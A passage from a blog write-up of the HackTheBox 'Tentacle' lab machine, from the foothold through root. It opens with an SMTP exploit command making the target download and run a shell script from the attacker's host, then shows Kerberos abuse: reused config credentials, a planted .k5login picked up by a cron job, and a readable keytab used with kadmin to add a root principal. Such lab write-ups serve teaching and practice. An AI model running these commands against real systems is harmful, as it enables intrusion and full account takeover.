</pre><td class="rouge-code"><pre>proxychains python smtp-rce.py 10.241.251.113 25 <span class="s1">'wget -q -O ss.sh 10.10.15.71/shell.sh;bash ss.sh'</span>
</pre></table></code></div></div><p><img data-src="/assets/img/posts/tentacle/reverse-shell.png" alt="" data-proofer-ignore></p><h1 id="privesc">Privesc</h1><h2 id="ssh-with-kerberos-token"><span class="mr-2">ssh with kerberos token</span><a href="#ssh-with-kerberos-token" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>get root shell on smtp server host.</p><p>user which email found from squid is in this box. Found msmtp(an SMTP client) config file in his home folder and config file contains user’s creds.</p><p><img data-src="/assets/img/posts/tentacle/user-creds.png" alt="" data-proofer-ignore></p><p>creds not working for ssh but working for <a href="https://ubuntu.com/server/docs/service-kerberos">kerberos</a>.</p><p><strong>kerberos</strong> is a computer-network authentication protocol that works on the basis of tickets to allow nodes communicating over a non-secure network to prove their identity to one another in a secure manner.</p><p>that means we can create token from <code class="language-plaintext highlighter-rouge">krb5-user</code> tool to login to ssh as user “j.nakazawa”</p><p>install Package with <code class="language-plaintext highlighter-rouge">sudo apt install krb5-user</code></p><p>configure <code class="language-plaintext highlighter-rouge">/etc/krb5.conf</code></p><div class="language-conf highlighter-rouge"><div class="code-header"> <span data-label-text="Conf"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>[<span class="n">libdefaults</span>]
	<span class="n">default_realm</span> = <span class="n">REALCORP</span>.<span class="n">HTB</span>

[<span class="n">realms</span>]
        <span class="n">REALCORP</span>.<span class="n">HTB</span> = {
                <span class="n">kdc</span> = <span class="n">REALCORP</span>.<span class="n">HTB</span>
                <span class="n">admin_server</span> = <span class="n">REALCORP</span>.<span class="n">HTB</span>
                <span class="n">default_domain</span> = <span class="n">REALCORP</span>.<span class="n">HTB</span>
	}

[<span class="n">domain_realm</span>]
        .<span class="n">realcorp</span>.<span class="n">htb</span> = <span class="n">REALCORP</span>.<span class="n">HTB</span>
</pre></table></code></div></div><p><img data-src="/assets/img/posts/tentacle/gen-krb-token.png" alt="" data-proofer-ignore></p><p>and get the auth token for user “j.nakazawa”</p><p>but Login with the token is not working and after some research found <a href="https://uz.sns.it/~enrico/site/posts/kerberos/password-less-ssh-login-with-kerberos.html">solution</a></p><p><strong>GSSAPI</strong>(Generic Security Services API) allows applications to communicate securely using Kerberos 5 or other security mechanisms.</p><p>SSH login command</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>kinit j.nakazawa
klist
ssh <span class="nt">-o</span> <span class="nv">GSSAPIAuthentication</span><span class="o">=</span><span class="nb">yes</span> <span class="nt">-o</span> <span class="nv">GSSAPIDelegateCredentials</span><span class="o">=</span><span class="nb">yes</span> <span class="nt">-o</span> <span class="nv">GSSAPIServerIdentity</span><span class="o">=</span>srv01.realcorp.htb j.nakazawa@REALCORP.HTB
</pre></table></code></div></div><p><img data-src="/assets/img/posts/tentacle/token-to-ssh.png" alt="" data-proofer-ignore></p><p><strong>Update:</strong> <code class="language-plaintext highlighter-rouge">GSSAPIAuthentication</code> already enables by default from ssh config file so <code class="language-plaintext highlighter-rouge">-o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes</code> are not required, the real reason for this to not work because GSSAPI checking for user in <code class="language-plaintext highlighter-rouge">REALCORP.HTB</code>’s krb database but user is in <code class="language-plaintext highlighter-rouge">srv01.realcorp.htb</code> and if we add <code class="language-plaintext highlighter-rouge">srv01.realcorp.htb</code> in <code class="language-plaintext highlighter-rouge">hosts</code> file and login with this host, it still won’t work because GSSAPI takes first host name from <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file, for this problem we can use <code class="language-plaintext highlighter-rouge">GSSAPIServerIdentity</code> to specify host which to look for.</p><h2 id="k5login"><span class="mr-2">k5login</span><a href="#k5login" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Found crontab running <code class="language-plaintext highlighter-rouge">/usr/local/bin/log_backup.sh</code> as user “admin” on <code class="language-plaintext highlighter-rouge">srv01</code> host</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> admin /usr/local/bin/log_backup.sh
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="o">[</span>j.nakazawa@srv01 krb5.conf.d]<span class="nv">$ </span><span class="nb">cat</span> /usr/local/bin/log_backup.sh
<span class="c">#!/bin/bash</span>

/usr/bin/rsync <span class="nt">-avz</span> <span class="nt">--no-perms</span> <span class="nt">--no-owner</span> <span class="nt">--no-group</span> /var/log/squid/ /home/admin/
<span class="nb">cd</span> /home/admin
/usr/bin/tar czf squid_logs.tar.gz.<span class="sb">`</span>/usr/bin/date +%F-%H%M%S<span class="sb">`</span> access.log cache.log
/usr/bin/rm <span class="nt">-f</span> access.log cache.log
</pre></table></code></div></div><p>script is syncing <code class="language-plaintext highlighter-rouge">/var/log/squid/</code> to <code class="language-plaintext highlighter-rouge">/home/admin/</code>, that means all file from <code class="language-plaintext highlighter-rouge">/var/log/squid/</code> direcotry copy to <code class="language-plaintext highlighter-rouge">/home/admin/</code> and than creates tar archive from these file.</p><p>Found a login technique with kerberos with <code class="language-plaintext highlighter-rouge">.k5login</code> config file from <a href="https://web.mit.edu/kerberos/krb5-devel/doc/user/user_config/k5login.html">kerberos docs</a></p><p><strong>EXAMPLES</strong></p><p>Suppose the user “alice” had a <code class="language-plaintext highlighter-rouge">.k5login</code> file in her <strong>home directory</strong> containing just the following line:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>bob@FOOBAR.ORG
</pre></table></code></div></div><p>This would allow user “bob” to use Kerberos network applications, such as <code class="language-plaintext highlighter-rouge">ssh</code>, to <strong>access alice‘s account</strong>, using <strong>bob‘s Kerberos tickets</strong>.</p><p>and we can use this technique to login to user “admin” with running cronjob.</p><p><strong>Create <code class="language-plaintext highlighter-rouge">.k5login</code> file in the <code class="language-plaintext highlighter-rouge">/var/log/squid/</code> folder.</strong></p><p><em>user “j.nakazawa” is in squid group but <code class="language-plaintext highlighter-rouge">/var/log/squid</code> directory don’t have read permission.</em></p><p><img data-src="/assets/img/posts/tentacle/squid-log.png" alt="" data-proofer-ignore></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s1">'j.nakazawa@REALCORP.HTB'</span> <span class="o">&gt;</span> /var/log/squid/.k5login
</pre></table></code></div></div><p>and ssh to “admin” with user “j.nakazawa” token</p><p><img data-src="/assets/img/posts/tentacle/k5admin.png" alt="" data-proofer-ignore></p><h2 id="kadmin"><span class="mr-2">kadmin</span><a href="#kadmin" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Runing linpeas from “admin” found some interesting kerberos information.</p><p>Found <a href="https://web.mit.edu/kerberos/krb5-1.12/doc/admin/admin_commands/kadmin_local.html">kadmin</a> utility</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>kadmin was found on /usr/bin/kadmin
</pre></table></code></div></div><p>Found readable <a href="https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-install/The-Keytab-File.html"><code class="language-plaintext highlighter-rouge">krb5.keytab</code></a> file</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre>keytab file found, you may be able to impersonate some kerberos principals and add <span class="nb">users </span>or modify passwords
Keytab name: FILE:/etc/krb5.keytab
KVNO Principal
<span class="nt">----</span> <span class="nt">--------------------------------------------------------------------------</span>
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
  <span class="nt">---</span> Impersonation <span class="nb">command</span>: kadmin <span class="nt">-k</span> <span class="nt">-t</span> /etc/krb5.keytab <span class="nt">-p</span> <span class="s2">"host/srv01.realcorp.htb@REALCORP.HTB"</span>
  <span class="nt">---</span> Impersonation <span class="nb">command</span>: kadmin <span class="nt">-k</span> <span class="nt">-t</span> /etc/krb5.keytab <span class="nt">-p</span> <span class="s2">"host/srv01.realcorp.htb@REALCORP.HTB"</span>
  <span class="nt">---</span> Impersonation <span class="nb">command</span>: kadmin <span class="nt">-k</span> <span class="nt">-t</span> /etc/krb5.keytab <span class="nt">-p</span> <span class="s2">"host/srv01.realcorp.htb@REALCORP.HTB"</span>
  <span class="nt">---</span> Impersonation <span class="nb">command</span>: kadmin <span class="nt">-k</span> <span class="nt">-t</span> /etc/krb5.keytab <span class="nt">-p</span> <span class="s2">"host/srv01.realcorp.htb@REALCORP.HTB"</span>
  <span class="nt">---</span> Impersonation <span class="nb">command</span>: kadmin <span class="nt">-k</span> <span class="nt">-t</span> /etc/krb5.keytab <span class="nt">-p</span> <span class="s2">"host/srv01.realcorp.htb@REALCORP.HTB"</span>
  <span class="nt">---</span> Impersonation <span class="nb">command</span>: kadmin <span class="nt">-k</span> <span class="nt">-t</span> /etc/krb5.keytab <span class="nt">-p</span> <span class="s2">"kadmin/changepw@REALCORP.HTB"</span>
  <span class="nt">---</span> Impersonation <span class="nb">command</span>: kadmin <span class="nt">-k</span> <span class="nt">-t</span> /etc/krb5.keytab <span class="nt">-p</span> <span class="s2">"kadmin/changepw@REALCORP.HTB"</span>
  <span class="nt">---</span> Impersonation <span class="nb">command</span>: kadmin <span class="nt">-k</span> <span class="nt">-t</span> /etc/krb5.keytab <span class="nt">-p</span> <span class="s2">"kadmin/changepw@REALCORP.HTB"</span>
  <span class="nt">---</span> Impersonation <span class="nb">command</span>: kadmin <span class="nt">-k</span> <span class="nt">-t</span> /etc/krb5.keytab <span class="nt">-p</span> <span class="s2">"kadmin/changepw@REALCORP.HTB"</span>
  <span class="nt">---</span> Impersonation <span class="nb">command</span>: kadmin <span class="nt">-k</span> <span class="nt">-t</span> /etc/krb5.keytab <span class="nt">-p</span> <span class="s2">"kadmin/changepw@REALCORP.HTB"</span>
  <span class="nt">---</span> Impersonation <span class="nb">command</span>: kadmin <span class="nt">-k</span> <span class="nt">-t</span> /etc/krb5.keytab <span class="nt">-p</span> <span class="s2">"kadmin/admin@REALCORP.HTB"</span>
  <span class="nt">---</span> Impersonation <span class="nb">command</span>: kadmin <span class="nt">-k</span> <span class="nt">-t</span> /etc/krb5.keytab <span class="nt">-p</span> <span class="s2">"kadmin/admin@REALCORP.HTB"</span>
  <span class="nt">---</span> Impersonation <span class="nb">command</span>: kadmin <span class="nt">-k</span> <span class="nt">-t</span> /etc/krb5.keytab <span class="nt">-p</span> <span class="s2">"kadmin/admin@REALCORP.HTB"</span>
  <span class="nt">---</span> Impersonation <span class="nb">command</span>: kadmin <span class="nt">-k</span> <span class="nt">-t</span> /etc/krb5.keytab <span class="nt">-p</span> <span class="s2">"kadmin/admin@REALCORP.HTB"</span>
  <span class="nt">---</span> Impersonation <span class="nb">command</span>: kadmin <span class="nt">-k</span> <span class="nt">-t</span> /etc/krb5.keytab <span class="nt">-p</span> <span class="s2">"kadmin/admin@REALCORP.HTB"</span>
</pre></table></code></div></div><p>we can use keytab admin principal to authenticate into Kerberos V5 administration system console.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>kadmin <span class="nt">-k</span> <span class="nt">-t</span> /etc/krb5.keytab <span class="nt">-p</span> <span class="s2">"kadmin/admin@REALCORP.HTB"</span>
<span class="c"># -t keytab file</span>
<span class="c"># -k use that keytab file to authenticate</span>
<span class="c"># -p specify principal</span>
</pre></table></code></div></div><p>A Kerberos principal is a unique identity to which Kerberos can assign tickets. if we create principal for root user than we can use “<a href="https://web.mit.edu/kerberos/krb5-latest/doc/user/user_commands/ksu.html">ksu</a>” to change user to root.</p><p>with <code class="language-plaintext highlighter-rouge">add_principal</code> command we can add keytab principal, But it This command requires the “add” privilege.</p><p><strong>Check privileges with <code class="language-plaintext highlighter-rouge">get_privs</code> command</strong></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>kadmin:  get_privs
current privileges: INQUIRE ADD MODIFY DELETE
</pre></table></code></div></div><p><strong>adding principal</strong></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>add_principal root@REALCORP.HTB
</pre></table></code></div></div><p><strong>than change user to root</strong></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ksu root
</pre></table></code></div></div><p><img data-src="/assets/img/posts/tentacle/tentacle-rooted.png" alt="" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a>, <a href='/categories/linux/'>linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/dns/" class="post-tag no-text-decoration" >dns</a> <a href="/tags/squid-proxy/" class="post-tag no-text-decoration" >squid proxy</a> <a href="/tags/ffuf-with-multi-proxy/" class="post-tag no-text-decoration" >ffuf with multi-proxy</a> <a href="/tags/opensmtpd/" class="post-tag no-text-decoration" >opensmtpd</a> <a href="/tags/cve-2020-7247/" class="post-tag no-text-decoration" >cve-2020-7247</a> <a href="/tags/kerberos/" class="post-tag no-text-decoration" >kerberos</a> <a href="/tags/kerberos-token/" class="post-tag no-text-decoration" >kerberos token</a> <a href="/tags/k5login/" class="post-tag no-text-decoration" >k5login</a> <a href="/tags/kadmin/" class="post-tag no-text-decoration" >kadmin</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox - Tentacle - Poorduck&amp;url=https://x00tex.github.io/posts/tentacle/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox - Tentacle - Poorduck&amp;u=https://x00tex.github.io/posts/tentacle/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://x00tex.github.io/posts/tentacle/&amp;text=Hackthebox - Tentacle - Poorduck" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/meta/">Hackthebox - Meta</a><li><a href="/posts/pandora/">Hackthebox - Pandora</a><li><a href="/posts/writer/">Hackthebox - Writer</a><li><a href="/posts/blunder/">Hackthebox - Blunder</a><li><a href="/posts/luanne/">Hackthebox - Luanne</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/command-injection/">command injection</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/file-upload/">file-upload</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/ssti/">ssti</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/awscli/">awscli</a> <a class="post-tag" href="/tags/dns/">dns</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/unbalanced/"><div class="card-body"> <em class="timeago small" data-ts="1606156200" > 2020-11-23 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Unbalanced</h3><div class="text-muted small"><p> Scanning Nmap ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.200 | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) echo $ports &amp;amp;&amp;amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10...</p></div></div></a></div><div class="card"> <a href="/posts/crossFitTwo/"><div class="card-body"> <em class="timeago small" data-ts="1629484200" > 2021-08-20 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - CrossFitTwo</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.10.232 crossfit.htb nmap scan: 1 2 3 4 5 6 7 8 9 10 11 12 13 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4 (protocol...</p></div></div></a></div><div class="card"> <a href="/posts/unicode/"><div class="card-body"> <em class="timeago small" data-ts="1638383400" > 2021-12-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Unicode</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.11.126 hackmedia.htb nmap scan: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/dynstr/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox - Dynstr</p></a> <a href="/posts/explore/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox - Explore</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/p00rduck">p00rduck</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/command-injection/">command injection</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/file-upload/">file-upload</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/ssti/">ssti</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/awscli/">awscli</a> <a class="post-tag" href="/tags/dns/">dns</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
